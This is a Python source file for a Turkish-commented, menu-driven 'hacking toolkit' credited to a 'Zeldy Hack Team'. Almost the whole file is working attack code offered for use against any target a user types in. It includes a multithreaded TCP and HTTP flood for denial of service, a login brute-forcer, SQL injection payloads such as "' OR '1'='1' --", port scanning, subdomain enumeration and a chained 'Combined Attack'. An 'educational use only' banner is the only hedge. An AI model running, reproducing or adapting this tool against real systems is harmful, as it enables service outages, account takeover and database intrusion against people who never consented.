# SA_Hacking_Toolkit.py
import socket
import threading
import requests
import random
import time
import sys
import os
from datetime import datetime
from queue import Queue

class SA_Hacker:
    def __init__(self):
        self.active_attacks = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]
    
    def port_scanner(self, target, start_port=1, end_port=1024, threads=100):
        """Hızlı port tarama"""
        print(f"[+] Port tarama başlatıldı: {target}")
        open_ports = []
        queue = Queue()
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "Unknown"
                    print(f"[!] AÇIK PORT: {port} - {service}")
                sock.close()
            except:
                pass
        
        def worker():
            while not queue.empty():
                port = queue.get()
                scan_port(port)
                queue.task_done()
        
        # Portları kuyruğa ekle
        for port in range(start_port, end_port + 1):
            queue.put(port)
        
        # Thread'leri başlat
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
        
        queue.join()
        return open_ports
    
    def ddos_attack(self, target, port=80, threads=500, duration=60):
        """Basit DDoS saldırısı"""
        print(f"[+] DDoS başlatıldı: {target}:{port}")
        print(f"[!] Süre: {duration} saniye")
        
        attack_id = f"DDoS_{datetime.now().strftime('%H%M%S')}"
        self.active_attacks.append(attack_id)
        
        packets_sent = 0
        stop_flag = False
        
        def attack():
            nonlocal packets_sent
            while not stop_flag:
                try:
                    # TCP flood
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target, port))
                    
                    # Rastgele veri gönder
                    payload = random._urandom(1024)
                    sock.send(payload)
                    packets_sent += 1
                    
                    sock.close()
                    
                    # HTTP flood
                    if port == 80 or port == 443:
                        try:
                            url = f"http://{target}" if port == 80 else f"https://{target}"
                            headers = {'User-Agent': random.choice(self.user_agents)}
                            requests.get(url, headers=headers, timeout=1)
                            packets_sent += 1
                        except:
                            pass
                    
                    # Progress göstergesi
                    if packets_sent % 100 == 0:
                        print(f"[*] Paketler: {packets_sent}", end='\r')
                        
                except:
                    # Bağlantı hatası - tekrar dene
                    time.sleep(0.1)
        
        # Thread'leri başlat
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        # Süre timer
        time.sleep(duration)
        stop_flag = True
        
        # Thread'leri bekle
        for t in threads_list:
            t.join(timeout=1)
        
        self.active_attacks.remove(attack_id)
        print(f"\n[+] DDoS tamamlandı: {packets_sent} paket gönderildi")
        return packets_sent
    
    def brute_force(self, target, username_list, password_list, login_url, method="POST"):
        """HTTP Brute Force saldırısı"""
        print(f"[+] Brute Force başlatıldı: {target}")
        
        found_creds = []
        
        def try_login(username, password):
            try:
                session = requests.Session()
                
                if method.upper() == "POST":
                    data = {
                        'username': username,
                        'password': password,
                        'login': 'submit'
                    }
                    response = session.post(login_url, data=data, timeout=5)
                else:
                    # GET method
                    params = {
                        'user': username,
                        'pass': password
                    }
                    response = session.get(login_url, params=params, timeout=5)
                
                # Başarılı giriş kontrolü (basit)
                if response.status_code == 200:
                    # Başarılı girişi tespit etmek için basit kontrol
                    fail_keywords = ['invalid', 'wrong', 'error', 'failed']
                    success = True
                    
                    for keyword in fail_keywords:
                        if keyword in response.text.lower():
                            success = False
                            break
                    
                    if success:
                        print(f"[!] BULUNDU: {username}:{password}")
                        found_creds.append((username, password))
                        return True
                        
            except Exception as e:
                pass
            
            return False
        
        # Brute force döngüsü
        for username in username_list:
            for password in password_list:
                print(f"[*] Deneniyor: {username}:{password}", end='\r')
                if try_login(username, password):
                    # Bulundu, diğer kombinasyonları atla
                    break
        
        print(f"\n[+] Brute Force tamamlandı: {len(found_creds)} kullanıcı bulundu")
        return found_creds
    
    def sql_injection(self, target, param="id"):
        """Basit SQL Injection testi"""
        print(f"[+] SQL Injection testi: {target}")
        
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT null, null --",
            "' AND 1=1 --",
            "' AND 1=2 --"
        ]
        
        vulnerable = False
        
        for payload in payloads:
            try:
                # GET parametresi ile test
                test_url = f"{target}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                
                # SQL error kontrolü
                error_keywords = [
                    'sql', 'syntax', 'mysql', 'oracle',
                    'database', 'query', 'warning', 'error'
                ]
                
                for keyword in error_keywords:
                    if keyword in response.text.lower():
                        print(f"[!] SQL Injection bulundu: {payload}")
                        vulnerable = True
                        break
                
                # Farklı response uzunluğu kontrolü
                if len(response.text) > 10000:  # Çok büyük response
                    print(f"[!] Possible Blind SQLi: {payload}")
                    vulnerable = True
                
            except Exception as e:
                print(f"[*] Payload test edilemedi: {payload}")
        
        return vulnerable
    
    def subdomain_enum(self, domain):
        """Subdomain enumeration"""
        print(f"[+] Subdomain taranıyor: {domain}")
        
        subdomains = []
        wordlist = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev',
            'api', 'blog', 'shop', 'app', 'secure', 'portal',
            'cpanel', 'webmail', 'ns1', 'ns2', 'dns', 'm'
        ]
        
        for sub in wordlist:
            target = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(target)
                print(f"[!] Subdomain bulundu: {target} -> {ip}")
                subdomains.append((target, ip))
            except:
                pass
        
        return subdomains
    
    def banner_grab(self, target, port=80):
        """Banner grabbing"""
        print(f"[+] Banner grabbing: {target}:{port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, port))
            
            # HTTP request gönder
            if port == 80 or port == 443:
                sock.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % target.encode())
            
            # Response al
            banner = sock.recv(1024)
            sock.close()
            
            print(f"[!] Banner:\n{banner.decode('utf-8', errors='ignore')[:500]}")
            return banner
            
        except Exception as e:
            print(f"[*] Banner alınamadı: {e}")
            return None
    
    def menu(self):
        """Ana menü"""
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("""
            ╔════════════════════════════════════════╗
            ║        🚀 ZELDY HACKING TOOL 🚀              ║
            ║        Zeldy Hack Team - 2026        ║
            ╚════════════════════════════════════════╝
          
      1️⃣  Port Scanner
      2️⃣  DDoS Attack
      3️⃣  Brute Force
      4️⃣  SQL Injection Test
      5️⃣  Subdomain Enumeration
      6️⃣  Banner Grabbing
      7️⃣  Combined Attack
      8️⃣  Exit
            
            Aktif Saldırılar: {}
            """.format(len(self.active_attacks)))
            
            choice = input("\n[?] Seçim yap (1-8): ")
            
            if choice == "1":
                target = input("[?] Hedef IP/Domain: ")
                start = int(input("[?] Başlangıç portu (1): ") or "1")
                end = int(input("[?] Bitiş portu (1024): ") or "1024")
                self.port_scanner(target, start, end)
                input("\n[?] Devam etmek için Enter...")
                
            elif choice == "2":
                target = input("[?] Hedef IP/Domain: ")
                port = int(input("[?] Port (80): ") or "80")
                threads = int(input("[?] Thread sayısı (500): ") or "500")
                duration = int(input("[?] Süre (saniye, 60): ") or "60")
                self.ddos_attack(target, port, threads, duration)
                input("\n[?] Devam etmek için Enter...")
                
            elif choice == "3":
                target = input("[?] Login URL: ")
                users = input("[?] Username list (virgülle ayır): ").split(',')
                passes = input("[?] Password list (virgülle ayır): ").split(',')
                self.brute_force(target, users, passes, target)
                input("\n[?] Devam etmek için Enter...")
                
            elif choice == "4":
                target = input("[?] Hedef URL: ")
                param = input("[?] Parametre (id): ") or "id"
                self.sql_injection(target, param)
                input("\n[?] Devam etmek için Enter...")
                
            elif choice == "5":
                domain = input("[?] Domain: ")
                self.subdomain_enum(domain)
                input("\n[?] Devam etmek için Enter...")
                
            elif choice == "6":
                target = input("[?] Hedef IP/Domain: ")
                port = int(input("[?] Port (80): ") or "80")
                self.banner_grab(target, port)
                input("\n[?] Devam etmek için Enter...")
                
            elif choice == "7":
                print("[+] Combined Attack başlatılıyor...")
                target = input("[?] Hedef: ")
                
                # Port scan
                print("\n[1/5] Port tarama...")
                ports = self.port_scanner(target, 1, 1000)
                
                # Subdomain enum
                print("\n[2/5] Subdomain tarama...")
                subs = self.subdomain_enum(target.split('/')[-1])
                
                # Banner grab
                print("\n[3/5] Banner grabbing...")
                if ports:
                    self.banner_grab(target, ports[0])
                
                # SQL test
                print("\n[4/5] SQL Injection test...")
                self.sql_injection(target if 'http' in target else f"http://{target}")
                
                # DDoS (kısa)
                print("\n[5/5] Quick DDoS test...")
                self.ddos_attack(target, 80, 100, 10)
                
                input("\n[?] Devam etmek için Enter...")
                
            elif choice == "8":
                print("[+] Çıkış yapılıyor...")
                # Aktif saldırıları durdur
                self.active_attacks.clear()
                break
            
            else:
                print("[!] Geçersiz seçim!")

# Çalıştır
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║     🚀 SA HACKING TOOLKIT - ZELDY HACK TEAM 🚀          ║
    ║                                                          ║
    ║  ⚠️  UYARI: Bu araç sadece eğitim amaçlıdır!            ║
    ║      Yetkisiz erişim ve saldırılar YASAKTIR!            ║
    ║      Sadece kendi sistemlerinizde test yapın.           ║
    ║                                                          ║
    ║  🔥 Port Scanner | DDoS | Brute Force | SQLi            ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    hacker = SA_Hacker()
    
    try:
        hacker.menu()
    except KeyboardInterrupt:
        print("\n[!] Program kapatıldı")
    except Exception as e:
        print(f"[!] Hata: {e}")
              
